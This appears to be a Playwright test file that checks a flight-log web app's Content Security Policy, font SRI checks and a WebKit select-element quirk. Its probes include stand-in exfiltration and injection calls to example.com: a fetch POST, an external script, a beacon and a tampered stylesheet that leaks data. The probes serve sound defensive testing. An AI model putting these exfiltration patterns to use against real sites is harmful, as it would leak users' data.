import { readFile } from "node:fs/promises";
import { expect, test, type Page } from "@playwright/test";
import { importArchive } from "../e2e/helpers/responsive";
import { openSettingsCategory } from "../e2e/helpers/settings";
import {
  documentDirectives,
  documentPolicy,
} from "../apps/web/security-policy.mjs";

type Violation = {
  directive: string;
  blocked: string;
  sample: string;
  disposition: SecurityPolicyViolationEvent["disposition"];
  /** nodeName of the event target at the moment of the violation. */
  target: string;
  /** Whether that target carried a style attribute at that moment. */
  targetStyled: boolean;
};

type Observed = {
  violations: Violation[];
  /** Elements seen carrying a style attribute that CSP refused to apply. */
  blockedStyles: string[];
  /** Distinct native selects created or inserted since load. */
  selectsCreated: number;
  /** <select> elements removed from the document since load. */
  selectsRemoved: number;
};

// WebKit 27.2 styles a native <select>'s UA shadow slot at creation, even
// if the select is never attached. Its queued event then targets document,
// without any observable select removal. A test-only report-sample policy
// identifies that exact internal declaration; the enforced production meta
// policy remains unchanged. Pair reports one-to-one, capped by the observed
// native selects, so even an extra pair with the same sample still fails.
const isQuirkShape = (violation: Violation) =>
  violation.directive === "style-src-attr" &&
  violation.blocked === "inline" &&
  violation.sample === "";
function webkitSelectQuirks(observed: Observed) {
  const remaining = new Set(observed.violations);
  let pairs = 0;
  if (observed.blockedStyles.length === 0) {
    for (const violation of observed.violations) {
      if (
        violation.disposition !== "enforce" ||
        !isQuirkShape(violation) ||
        violation.targetStyled ||
        !["SELECT", "#document"].includes(violation.target)
      )
        continue;
      const sample = [...remaining].find(
        (report) =>
          report.disposition === "report" &&
          report.directive === violation.directive &&
          report.blocked === violation.blocked &&
          report.target === violation.target &&
          !report.targetStyled &&
          report.sample === "text-overflow:inherit",
      );
      if (sample && pairs < observed.selectsCreated) {
        remaining.delete(sample);
        remaining.delete(violation);
        pairs++;
      }
    }
  }
  return {
    real: [...remaining],
    quirks: observed.violations.filter(
      (violation) => !remaining.has(violation),
    ),
  };
}
const webkitSelectConsole =
  /^(?:\[Report Only\] )?Refused to apply a stylesheet because its hash, its nonce, or 'unsafe-inline' does not appear in the style-src directive/;

async function watchViolations(page: Page, browserName: string) {
  if (browserName === "webkit") {
    // style-src (rather than style-src-attr) makes WebKit include samples.
    // Keep the production source list and collect reports locally only.
    const style = documentDirectives.find(([name]) => name === "style-src")!;
    await page.route("**/*", async (route) => {
      if (route.request().resourceType() !== "document")
        return route.fallback();
      const response = await route.fetch();
      await route.fulfill({
        response,
        headers: {
          ...response.headers(),
          "content-security-policy-report-only": `${style[0]} ${style[1].join(" ")} 'report-sample'; report-uri /__csp-observer-report`,
        },
      });
    });
    await page.route("**/__csp-observer-report", (route) =>
      route.fulfill({ status: 204, body: "" }),
    );
  }
  await page.addInitScript(() => {
    const state = window as unknown as {
      __cspViolations: unknown[];
      __blockedStyles: string[];
      __selectsCreated: number;
      __selectsRemoved: number;
    };
    state.__cspViolations = [];
    state.__blockedStyles = [];
    state.__selectsCreated = 0;
    state.__selectsRemoved = 0;
    document.addEventListener(
      "securitypolicyviolation",
      (event) => {
        const target = event.target;
        state.__cspViolations.push({
          directive: event.effectiveDirective || event.violatedDirective,
          blocked: event.blockedURI,
          sample: event.sample,
          disposition: event.disposition,
          target: target instanceof Element ? target.nodeName : "#document",
          targetStyled:
            target instanceof Element && target.hasAttribute("style"),
        });
      },
      true,
    );
    // Second detector, independent of violation events: in WebKit (and
    // Chromium) a style attribute CSP refused keeps its text but exposes no
    // declarations (CSSOM writes, which CSP allows, keep the two in sync).
    // Firefox keeps the declarations without applying them, so there this
    // detector stays silent; it only gates WebKit's sampled exemption.
    const refused = (element: Element) => {
      const text = element.getAttribute("style");
      return (
        text !== null &&
        text.trim() !== "" &&
        (element as HTMLElement).style?.cssText === ""
      );
    };
    const blocked = new WeakSet<Element>();
    const selects = new WeakSet<HTMLSelectElement>();
    const countSelects = (element: Element) => {
      for (const candidate of [element, ...element.querySelectorAll("select")])
        if (candidate instanceof HTMLSelectElement && !selects.has(candidate)) {
          selects.add(candidate);
          state.__selectsCreated++;
        }
    };
    const check = (element: Element) => {
      countSelects(element);
      for (const candidate of [element, ...element.querySelectorAll("[style]")])
        if (refused(candidate) && !blocked.has(candidate)) {
          // One element can occur in both insertion and attribute records
          // in the same delivery. Count elements, not mutation records.
          blocked.add(candidate);
          state.__blockedStyles.push(candidate.nodeName);
        }
    };
    const observer = new MutationObserver((records) => {
      for (const record of records) {
        if (record.type === "attributes" && record.target instanceof Element)
          check(record.target);
        for (const node of record.addedNodes)
          if (node instanceof Element) check(node);
        for (const node of record.removedNodes)
          if (node instanceof Element)
            state.__selectsRemoved +=
              (node.matches("select") ? 1 : 0) +
              node.querySelectorAll("select").length;
      }
    });
    const observe = (node: Node) =>
      observer.observe(node, {
        subtree: true,
        childList: true,
        attributes: true,
        attributeFilter: ["style"],
      });
    observe(document);
    // Detached application nodes never reach the document observer. Watch
    // each newly created element before its caller can set a style, including
    // parsed descendants. Native UA shadow trees remain browser-internal.
    for (const method of ["createElement", "createElementNS"] as const) {
      const create = Document.prototype[method];
      Object.defineProperty(Document.prototype, method, {
        ...Object.getOwnPropertyDescriptor(Document.prototype, method),
        value: function (this: Document, ...args: unknown[]) {
          const element = Reflect.apply(create, this, args) as Element;
          countSelects(element);
          observe(element);
          return element;
        },
      });
    }
  });
  const consoleErrors: string[] = [];
  page.on("console", (message) => {
    if (message.type() === "error") consoleErrors.push(message.text());
  });
  page.on("pageerror", (error) => consoleErrors.push(error.message));
  const readAll = () =>
    page.evaluate(() => {
      const state = window as unknown as {
        __cspViolations: Violation[];
        __blockedStyles: string[];
        __selectsCreated: number;
        __selectsRemoved: number;
      };
      return {
        violations: state.__cspViolations,
        blockedStyles: state.__blockedStyles,
        selectsCreated: state.__selectsCreated,
        selectsRemoved: state.__selectsRemoved,
      } satisfies Observed;
    });
  const real = (observed: Observed) =>
    browserName === "webkit"
      ? webkitSelectQuirks(observed).real
      : observed.violations;
  return {
    readAll,
    violations: async () => {
      const observed = await readAll();
      expect(observed.blockedStyles).toEqual([]);
      return real(observed);
    },
    // Async on purpose: console messages can land after an earlier
    // violations() snapshot, so the quirk events are re-read here and every
    // exempted console line must be matched by an exempt-shaped event.
    cspConsoleErrors: async () => {
      const csp = consoleErrors.filter((text) =>
        /Content.Security.Policy|CSP|style-src|script-src|connect-src/i.test(
          text,
        ),
      );
      const observed = await readAll();
      expect(observed.blockedStyles).toEqual([]);
      expect(real(observed)).toEqual([]);
      if (browserName !== "webkit") return csp;
      const quirks = csp.filter((text) => webkitSelectConsole.test(text));
      expect(quirks.length).toBeLessThanOrEqual(
        webkitSelectQuirks(observed).quirks.length,
      );
      return csp.filter((text) => !webkitSelectConsole.test(text));
    },
    consoleErrors,
  };
}

test("production build enforces the documented policy @cross-browser", async ({
  page,
}) => {
  await page.goto("/");
  const meta = await page
    .locator('meta[http-equiv="Content-Security-Policy"]')
    .getAttribute("content");
  expect(meta).toBe(documentPolicy);
  // Inline script, eval and cross-origin connections are refused.
  const probes = await page.evaluate(async () => {
    const results: Record<string, string> = {};
    // eval()/Function() cannot be probed from page.evaluate (DevTools
    // evaluation bypasses CSP); scripts/check-security-headers.mjs proves the
    // shipped bundles never call them, so 'unsafe-eval' is not needed.
    const marker = "__inlineRan";
    const script = document.createElement("script");
    script.textContent = `window.${marker} = true`;
    document.head.append(script);
    results.inline = (window as unknown as Record<string, unknown>)[marker]
      ? "allowed"
      : "blocked";
    try {
      await fetch("https://example.com/exfiltrate", {
        method: "POST",
        body: "x",
      });
      results.fetch = "allowed";
    } catch {
      results.fetch = "blocked";
    }
    results.external = await new Promise<string>((resolve) => {
      const external = document.createElement("script");
      external.src = "https://example.com/injected.js";
      external.onload = () => resolve("allowed");
      external.onerror = () => resolve("blocked");
      document.head.append(external);
    });
    results.beacon = navigator.sendBeacon("https://example.com/b", "x")
      ? "queued"
      : "refused";
    return results;
  });
  expect(probes.inline).toBe("blocked");
  expect(probes.fetch).toBe("blocked");
  expect(probes.external).toBe("blocked");
});

test("the demo archive starts without CSP violations @cross-browser", async ({
  page,
  browserName,
}) => {
  const watch = await watchViolations(page, browserName);
  await page.route("https://cdn.jsdelivr.net/**", (route) => route.abort());
  await page.goto("/");
  await page.getByRole("button", { name: "Try demo", exact: true }).click();
  await expect(page.locator(".flight-row").first()).toBeVisible();
  expect(await watch.violations()).toEqual([]);
  expect(await watch.cspConsoleErrors()).toEqual([]);
});

for (const { name, viewport, size } of [
  {
    name: "desktop",
    viewport: { width: 1440, height: 1000 },
    size: { width: 1200, height: 1600 },
  },
  {
    name: "phone",
    viewport: { width: 390, height: 844 },
    size: { width: 1200, height: 1600 },
  },
]) {
  test(`Flight Passport share decodes and releases its image under production CSP (${name}) @cross-browser`, async ({
    page,
    browserName,
  }) => {
    const watch = await watchViolations(page, browserName);
    await page.route("https://cdn.jsdelivr.net/**", (route) => route.abort());
    await page.setViewportSize(viewport);
    await page.addInitScript(() => {
      const urls = {
        created: [] as string[],
        revoked: [] as { url: string; inUse: boolean }[],
      };
      (window as unknown as { __shareUrls: typeof urls }).__shareUrls = urls;
      const create = URL.createObjectURL.bind(URL);
      const revoke = URL.revokeObjectURL.bind(URL);
      URL.createObjectURL = (object) => {
        const url = create(object);
        urls.created.push(url);
        return url;
      };
      URL.revokeObjectURL = (url) => {
        urls.revoked.push({
          url,
          inUse: [...document.images].some((image) => image.src === url),
        });
        revoke(url);
      };
    });
    const readUrls = () =>
      page.evaluate(
        () =>
          (
            window as unknown as {
              __shareUrls: {
                created: string[];
                revoked: { url: string; inUse: boolean }[];
              };
            }
          ).__shareUrls,
      );

    // Import through the UI: production bundles have no /src module endpoints.
    await importArchive(page);
    await expect(
      page.locator('meta[http-equiv="Content-Security-Policy"]'),
    ).toHaveAttribute("content", documentPolicy);
    const before = page.url();
    await page.locator(".passport-share-button").click();
    const dialog = page.getByRole("dialog", { name: "Flight Passport" });
    await expect(dialog).toBeVisible();
    const image = dialog.locator(".share-overlay-image");
    await expect(image).toBeVisible({ timeout: 20_000 });
    await expect(dialog.locator(".share-overlay-hint")).toBeVisible();
    const url = await image.getAttribute("src");
    expect(url).toMatch(/^blob:/);

    // Decode the displayed <img> itself. fetch(blob:) would exercise
    // connect-src instead of img-src and is deliberately not allowed.
    const decoded = await image.evaluate(async (element: HTMLImageElement) => {
      const decoded = await element.decode().then(
        () => true,
        () => false,
      );
      return {
        decoded,
        width: element.naturalWidth,
        height: element.naturalHeight,
      };
    });
    expect.soft(decoded).toEqual({ decoded: true, ...size });
    expect(page.url()).toBe(before);
    expect(await readUrls()).toEqual({ created: [url], revoked: [] });
    expect.soft(await watch.violations()).toEqual([]);

    await dialog.getByRole("button", { name: "Close", exact: true }).click();
    await expect(dialog).toHaveCount(0);
    await expect.poll(readUrls).toEqual({
      created: [url],
      revoked: [{ url, inUse: false }],
    });
    // The wrapper delegates to native revokeObjectURL. Checking that call
    // and its timing is portable: Firefox can reuse decoded image pixels
    // even for a new Image with the revoked URL. fetch(blob:) is CSP-blocked.
    expect(await watch.violations()).toEqual([]);
    expect(await watch.cspConsoleErrors()).toEqual([]);
  });
}

test("core journeys raise no CSP violation: import, Passport map/Globe, detail Globe, settings, export @cross-browser", async ({
  page,
  browserName,
}) => {
  test.setTimeout(120_000);
  const watch = await watchViolations(page, browserName);
  // Keep this journey independent of the optional font CDN (covered below).
  await page.route("https://cdn.jsdelivr.net/**", (route) => route.abort());

  await importArchive(page);
  await expect(
    page.locator(".passport-globe-frame, .route-map-canvas").first(),
  ).toBeVisible();
  await page.getByRole("button", { name: /Open UA123/ }).click();
  await expect(page.locator("#flight-detail-title")).toBeVisible();
  await expect(page.locator(".detail-globe-frame .globe-host")).toHaveAttribute(
    "data-ready",
    "true",
    { timeout: 30_000 },
  );

  await page.goto("/#settings");
  await openSettingsCategory(page, "Data and backup");
  const download = page.waitForEvent("download");
  await page
    .getByRole("button", { name: "Export Keepraw Fly JSON", exact: true })
    .click();
  const file = await (await download).path();
  const exported = JSON.parse(await readFile(file!, "utf8"));
  expect(exported.format).toBe("keepraw-fly");

  // Locale resources are fetched on demand (connect-src 'self').
  await openSettingsCategory(page, "General");
  await page.locator(".settings-fields select").first().selectOption("ja-JP");
  await expect(page.locator("html")).toHaveAttribute("lang", "ja-JP");
  await page.goto("/#passport");
  await expect(page.locator(".flight-row").first()).toBeVisible();

  expect(await watch.violations()).toEqual([]);
  expect(await watch.cspConsoleErrors()).toEqual([]);
});

test("MiSans stylesheets load with SRI under CSP and map their weights @cross-browser", async ({
  page,
  browserName,
}) => {
  test.setTimeout(90_000);
  const watch = await watchViolations(page, browserName);
  await importArchive(page);
  await page.goto("/#settings");
  await page.locator(".settings-fields select").first().selectOption("zh-CN");
  await page.goto("/#passport");
  const links = page.locator("link[data-chinese-webfont]");
  await expect(links).toHaveCount(3);
  await expect
    .poll(
      () =>
        links.evaluateAll((all) =>
          all.map((link) => (link as HTMLLinkElement).dataset.fontStatus),
        ),
      { timeout: 30_000 },
    )
    .toEqual(["loaded", "loaded", "loaded"]);
  const mapped = await links.evaluateAll((all) =>
    all.every((element) => {
      const link = element as HTMLLinkElement;
      return (
        link.integrity.startsWith("sha384-") &&
        link.crossOrigin === "anonymous" &&
        [...link.sheet!.cssRules].every(
          (rule) =>
            (rule as CSSFontFaceRule).style.fontFamily.replaceAll('"', "") ===
              link.dataset.fontFamily &&
            (rule as CSSFontFaceRule).style.fontWeight ===
              link.dataset.fontWeight,
        )
      );
    }),
  );
  expect(mapped).toBe(true);
  await expect(page.locator(".passport-map-title")).toHaveCSS(
    "font-family",
    /MiSans/,
  );
  expect(await watch.violations()).toEqual([]);
});

test("a tampered MiSans stylesheet is rejected by SRI and the UI falls back to system fonts @cross-browser", async ({
  page,
}) => {
  const served: string[] = [];
  await page.route(
    "https://cdn.jsdelivr.net/npm/misans-webfont@4.3.1/**/result.min.css",
    (route) => {
      served.push(route.request().url());
      return route.fulfill({
        status: 200,
        contentType: "text/css",
        headers: { "access-control-allow-origin": "*" },
        body: 'body { background: url("https://example.com/leak?x=1"); }',
      });
    },
  );
  await importArchive(page);
  await page.goto("/#settings");
  await page.locator(".settings-fields select").first().selectOption("zh-TW");
  await page.goto("/#passport");
  const links = page.locator("link[data-chinese-webfont]");
  await expect(links).toHaveCount(3);
  await expect
    .poll(() =>
      links.evaluateAll((all) =>
        all.map((link) => (link as HTMLLinkElement).dataset.fontStatus),
      ),
    )
    .toEqual(["unavailable", "unavailable", "unavailable"]);
  expect(served).toHaveLength(3);
  // The modified sheet was never applied (its body background is absent).
  expect(
    await page.evaluate(() => getComputedStyle(document.body).backgroundImage),
  ).toBe("none");
  await expect(page.locator(".flight-row").first()).toBeVisible();
  await expect(page.locator("html")).toHaveAttribute("lang", "zh-TW");
});

for (const lifecycle of ["attached", "removed", "never attached"] as const) {
  test(`calibration: native <select> ${lifecycle} keeps its sampled WebKit shape @cross-browser`, async ({
    page,
    browserName,
  }) => {
    const watch = await watchViolations(page, browserName);
    await page.goto("/");
    await page.evaluate((lifecycle) => {
      const select = document.createElement("select");
      select.append(new Option("x"), new Option("y"));
      if (lifecycle !== "never attached") {
        document.body.append(select);
        select.getBoundingClientRect();
        select.value = "y";
        if (lifecycle === "removed") select.remove();
      }
    }, lifecycle);
    // Wait for the actual queued events, rather than an arbitrary delay.
    await expect
      .poll(async () => (await watch.readAll()).violations.length)
      .toBe(browserName === "webkit" ? 2 : 0);
    const observed = await watch.readAll();
    // If WebKit changes the declaration or event shape, re-derive the
    // exemption. Never keep a stale exemption by weakening calibration.
    expect(webkitSelectQuirks(observed).quirks).toHaveLength(
      browserName === "webkit" ? 2 : 0,
    );
    if (browserName === "webkit") {
      expect(observed.violations.map((v) => v.target)).toEqual([
        lifecycle === "attached" ? "SELECT" : "#document",
        lifecycle === "attached" ? "SELECT" : "#document",
      ]);
      const enforced = observed.violations.find(
        (v) => v.disposition === "enforce",
      )!;
      const extra = { ...enforced };
      expect(
        webkitSelectQuirks({
          ...observed,
          violations: [...observed.violations, extra],
        }).real,
      ).toEqual([extra]);
      // A matching report is not sufficient either: a genuine detached
      // style can have the same declaration as the UA. One native select
      // can account for only one report/enforce pair.
      const extraReport = {
        ...observed.violations.find((v) => v.disposition === "report")!,
      };
      expect(
        webkitSelectQuirks({
          ...observed,
          violations: [...observed.violations, extraReport, extra],
        }).real,
      ).toEqual([extraReport, extra]);
    }
    expect(observed.selectsCreated).toBe(1);
    expect(observed.selectsRemoved).toBe(lifecycle === "removed" ? 1 : 0);
    expect(observed.blockedStyles).toEqual([]);
    expect(await watch.violations()).toEqual([]);
    expect(await watch.cspConsoleErrors()).toEqual([]);
  });
}

for (const { declaration, cloned } of [
  { declaration: "color:red", cloned: false },
  { declaration: "text-overflow:inherit", cloned: false },
  { declaration: "text-overflow:inherit", cloned: true },
]) {
  test(`a real detached inline style (${declaration}, cloned=${cloned}) survives the native select exemption @cross-browser`, async ({
    page,
    browserName,
  }) => {
    const watch = await watchViolations(page, browserName);
    await page.goto("/");
    await page.evaluate(
      ({ declaration, cloned }) => {
        document.createElement("select");
        const original = document.createElement("div");
        const div = cloned ? (original.cloneNode() as Element) : original;
        div.setAttribute("style", declaration);
      },
      { declaration, cloned },
    );
    await expect
      .poll(async () => (await watch.readAll()).violations.length)
      .toBe(browserName === "webkit" ? 4 : 1);
    const observed = await watch.readAll();
    // Neither node enters the document. Observe newly created elements too:
    // an application declaration can be identical to WebKit's UA sample.
    // The clone is outside that observer too; the native select count must
    // still prevent its genuine violation from borrowing an extra UA pair.
    expect(observed.blockedStyles).toEqual(
      browserName === "firefox" || cloned ? [] : ["DIV"],
    );
    expect(observed.selectsCreated).toBe(1);
    expect(observed.selectsRemoved).toBe(0);
    expect(
      browserName === "webkit"
        ? webkitSelectQuirks(observed).real
        : observed.violations,
    ).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          directive: "style-src-attr",
          disposition: "enforce",
          target: "#document",
        }),
      ]),
    );
    await expect(watch.cspConsoleErrors()).rejects.toThrow();
  });
}

test("a real inline style is detected on a page that has <select> elements @cross-browser", async ({
  page,
  browserName,
}) => {
  const watch = await watchViolations(page, browserName);
  await page.goto("/");
  await page.evaluate(() => {
    const select = document.createElement("select");
    select.append(new Option("x"));
    document.body.append(select);
    select.getBoundingClientRect();
    // Real violations: a scripted style attribute, parsed markup, a style
    // attribute on the <select> itself (the quirk's own element), and a
    // styled element removed at once alongside a <select>, so its event is
    // retargeted to the document (the WebKit quirk's other shape).
    const div = document.createElement("div");
    div.setAttribute("style", "color: red");
    document.body.append(div);
    document.body.insertAdjacentHTML(
      "beforeend",
      '<span style="color: blue">x</span>',
    );
    select.setAttribute("style", "color: green");
    const fleeting = document.createElement("p");
    fleeting.setAttribute("style", "color: purple");
    document.body.append(fleeting);
    const spare = document.createElement("select");
    document.body.append(spare);
    fleeting.remove();
    spare.remove();
  });
  await expect
    .poll(async () =>
      (await watch.readAll()).violations
        .filter((v) => v.disposition === "enforce")
        .map((v) => v.target),
    )
    .toEqual(expect.arrayContaining(["DIV", "SPAN", "SELECT", "#document"]));
  const observed = await watch.readAll();
  // The second detector sees every one where the exemption depends on it.
  if (browserName !== "firefox")
    expect([...observed.blockedStyles].sort()).toEqual([
      "DIV",
      "P",
      "SELECT",
      "SPAN",
    ]);
  // With a refused style seen, no document-targeted event is exempt, and
  // each engine's own reports for the attached elements survive the filter.
  const reported = (
    browserName === "webkit"
      ? webkitSelectQuirks(observed).real
      : observed.violations
  ).filter((v) => v.directive === "style-src-attr");
  expect(reported.map((v) => v.target)).toEqual(
    expect.arrayContaining(["DIV", "SPAN", "SELECT", "#document"]),
  );
  expect(reported.length).toBeGreaterThanOrEqual(4);
  // The shared helper every journey uses fails on this page.
  await expect(watch.cspConsoleErrors()).rejects.toThrow();
  // None of them took effect.
  expect(
    await page.evaluate(() =>
      [...document.querySelectorAll("div[style], span[style], select[style]")]
        .map((element) => (element as HTMLElement).style.color)
        .join(""),
    ),
  ).toBe("");
});
